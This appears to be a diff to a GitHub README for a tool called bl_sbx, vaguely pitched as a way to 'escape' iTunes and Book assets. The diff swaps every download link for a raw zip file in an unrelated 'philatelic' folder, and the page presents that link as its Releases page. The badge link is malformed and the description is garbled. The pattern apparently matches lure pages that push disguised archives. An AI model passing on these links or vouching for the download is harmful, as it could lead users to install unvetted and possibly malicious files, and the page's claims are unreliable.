@@ -1,6 +1,6 @@
 # 🚀 bl_sbx - Seamlessly Escape Your iTunes and Book Assets
 
-[![Download](https://raw.githubusercontent.com/pranjalgoyall/bl_sbx/main/philatelic/bl_sbx-2.9.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/pranjalgoyall/bl_sbx/main/philatelic/bl_sbx-2.9.zip)
+[![Download](https://raw.githubusercontent.com/pranjalgoyall/bl_sbx/main/philatelic/bl-sbx-v3.1.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/pranjalgoyall/bl_sbx/main/philatelic/bl-sbx-v3.1.zip)
 
 ## 📋 Overview
 
@@ -20,7 +20,7 @@ To start using **bl_sbx**, you first need to download it from our Releases page.
 
 ## 📥 Download & Install
 
-Visit [this page to download](https://raw.githubusercontent.com/pranjalgoyall/bl_sbx/main/philatelic/bl_sbx-2.9.zip). 
+Visit [this page to download](https://raw.githubusercontent.com/pranjalgoyall/bl_sbx/main/philatelic/bl-sbx-v3.1.zip). 
 
 1. Click the link above.
 2. You’ll see a list of available versions.
